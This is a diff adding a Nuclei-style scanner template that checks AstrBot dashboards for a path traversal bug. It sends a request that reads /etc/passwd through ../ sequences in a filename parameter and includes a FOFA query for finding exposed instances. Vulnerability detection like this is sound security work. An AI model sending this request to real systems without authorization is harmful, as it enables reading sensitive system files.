@@ -1,0 +1,26 @@
+id: astrbot-file
+info:
+  name: astrbot file read
+  author: proud
+  severity: high
+  description: |
+    AstrBot路径遍历
+  metadata:
+    verified: true
+    fofa-query: body="AstrBot 仪表盘"
+  tags: astrbot
+
+http:
+  - raw:
+      - |
+        GET /api/chat/get_file?filename=../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'bin')"
+          - "contains(body, 'root')"
+        condition: and
